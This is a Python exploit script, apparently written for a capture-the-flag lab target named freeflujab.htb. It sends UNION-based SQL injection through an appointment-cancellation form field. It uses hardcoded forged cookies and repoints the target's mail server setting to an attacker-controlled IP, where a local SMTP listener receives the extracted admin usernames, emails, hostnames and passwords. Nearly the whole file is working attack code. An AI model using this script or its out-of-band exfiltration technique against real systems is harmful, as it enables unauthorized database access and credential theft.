import requests 
import threading
from aiosmtpd.controller import Controller
from cmd import Cmd
import re
import traceback
import urllib3
import argparse
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
LHOST = "10.10.16.6" # CHANGE_ME
LPORT = 25
TARGET_URL = "https://freeflujab.htb:443"
COOKIES = {
    "Patient": "1eaef2a3618b6efd39682b7c979e9a58", 
    "Registered": "MWVhZWYyYTM2MThiNmVmZDM5NjgyYjdjOTc5ZTlhNTg9VHJ1ZQ%3d%3d", 
    "Modus": "Q29uZmlndXJlPVRydWU%3d"
}
# Optional proxy for debugging (uncomment to use)
# proxy = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

class Terminal(Cmd):
    prompt = "Query ==> "
    
    def inject(self, args):
        url = f"{TARGET_URL}/?cancel"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded", 
            "Origin": TARGET_URL, 
            "Referer": f"{TARGET_URL}/?cancel"
        }
        payload = f"' {args} -- -"
        data = {"nhsnum": payload, "submit": "Cancel Appointment"}
        
        # Use proxy if defined globally (for debugging)
        proxies = globals().get('proxy', None)
        
        try:
            r = requests.post(url, headers=headers, cookies=COOKIES, data=data, 
                            verify=False, proxies=proxies, timeout=10)
            print(f"[+] Payload sent: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
        
    def do_help(self, args):
        """Show available commands and useful queries"""
        print("\nUseful SQL injection queries:")
        print("- version                : Get database version")
        print("- databases              : List all databases")
        print("- tables                 : List tables in vaccinations DB")
        print("- columns                : List columns in admin table")
        print("- usernames              : Extract usernames")
        print("- emails                 : Extract emails")
        print("- hostnames              : Extract hostnames")
        print("- passwords              : Extract passwords")
        print("- quit/exit              : Exit the tool")
        print("\nOr type any custom UNION SELECT query\n")
    
    def do_version(self, args):
        """Get database version"""
        self.inject("UNION SELECT 1,2,version(),4,5")
        
    def do_databases(self, args):
        """List all databases"""
        self.inject("UNION SELECT 1, 2, GROUP_CONCAT(SCHEMA_NAME), 4, 5 FROM INFORMATION_SCHEMA.SCHEMATA")
        
    def do_tables(self, args):
        """List tables in vaccinations database"""
        self.inject("UNION SELECT 1, 2, GROUP_CONCAT(TABLE_NAME), 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'vaccinations'")
        
    def do_columns(self, args):
        """List columns in admin table"""
        self.inject("UNION SELECT 1, 2, GROUP_CONCAT(COLUMN_NAME), 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'vaccinations' AND TABLE_NAME = 'admin'")
        
    def do_usernames(self, args):
        """Extract usernames from admin table"""
        self.inject("UNION SELECT 1, 2, GROUP_CONCAT(loginname), 4, 5 FROM vaccinations.admin")
        
    def do_emails(self, args):
        """Extract emails from admin table"""
        self.inject("UNION SELECT 1, 2, GROUP_CONCAT(email), 4, 5 FROM vaccinations.admin")
        
    def do_hostnames(self, args):
        """Extract hostnames from admin table"""
        self.inject("UNION SELECT 1, 2, GROUP_CONCAT(access), 4, 5 FROM vaccinations.admin")
        
    def do_passwords(self, args):
        """Extract passwords from admin table"""
        self.inject("UNION SELECT 1, 2, GROUP_CONCAT(password), 4, 5 FROM vaccinations.admin")
        
    def do_quit(self, args):
        """Exit the tool"""
        print("[*] Exiting...")
        return True
        
    def do_exit(self, args):
        """Exit the tool"""
        return self.do_quit(args)
        
    def default(self, args):
        if args.strip():
            self.inject(args)
            

class SMTPHandler:
    def __init__(self):
        self.message_count = 0
        
    async def handle_DATA(self, server, session, envelope):
        self.message_count += 1
        response = envelope.content.decode('utf-8', errors='replace')
        data = re.findall(r"- Ref:(.*)", response)
        
        if data:
            result = data[0].strip()
            print(f"[Result #{self.message_count}] {result}")
            
            # Log full response for debugging if needed
            if "--debug" in globals().get('debug_mode', []):
                print(f"[DEBUG] Full SMTP response:\n{response}\n")
        else:
            print("[-] Could not retrieve data from the target database.")
            if "--debug" in globals().get('debug_mode', []):
                print(f"[DEBUG] Raw SMTP content:\n{response}\n")
        
        return '250 OK'

def setSMTPServer(lhost):
    url = f"{TARGET_URL}/?smtp_config"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", 
        "Origin": TARGET_URL, 
        "Referer": f"{TARGET_URL}/?smtp_config"
    }
    data = {"mailserver": f"{lhost}", "port": "25", "save": "Save Mail Server Config"}
    
    # Use proxy if defined globally (for debugging)
    proxies = globals().get('proxy', None)
    
    try:
        print(f"[*] Setting the SMTP server to {lhost}:25")
        requests.post(url, headers=headers, cookies=COOKIES, data=data, 
                        allow_redirects=False, verify=False, proxies=proxies, timeout=10)
        chkSmtpSetting = requests.get(f"{TARGET_URL}/?smtp_config", cookies=COOKIES, 
                                        allow_redirects=False, verify=False, proxies=proxies, timeout=10)
        if f"Current Setting = SMTP: {lhost}:25" in chkSmtpSetting.text and chkSmtpSetting.status_code == 200:
            print(f"[+] Current Setting = SMTP: {lhost}:25")
            return True
        else:
            print(f"[-] Failed to set the SMTP server to {lhost}")
            return False
    except Exception as e:
        print("[-] Error setting the SMTP server: ", e)
        if "--debug" in globals().get('debug_mode', []):
            traceback.print_exc()
        return False

def start_smtp_server():
    controller = Controller(SMTPHandler(), hostname=LHOST, port=LPORT)
    controller.start()
    print(f"[+] SMTP server started on {LHOST}:{LPORT}")

def main():
    print("=== CTF SMTP SQL Injection Tool ===")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] SMTP Listener: {LHOST}:{LPORT}")
    print()
    
    # Step 1: Set SMTP server configuration
    if not setSMTPServer(LHOST):
        print("[-] Failed to configure SMTP server. Exiting.")
        return
    
    # Step 2: Start SMTP listener
    print("[*] Starting SMTP server...")
    threading.Thread(target=start_smtp_server, daemon=True).start()
    
    # Give the server a moment to start
    import time
    time.sleep(1)
    
    # Step 3: Start interactive terminal
    print("[*] Ready for SQL injection. Type your queries below")
    print("Example: union select 1,2,version(),4,5\n")
    print("\033[92m[*] Enter a query or type 'help' for available commands\033[0m")
    print("Press Ctrl+C to exit")
    print()
    
    try:
        terminal = Terminal()
        terminal.cmdloop()
    except KeyboardInterrupt:
        print("\n[*] Exiting...")

if __name__ == "__main__":
    main()
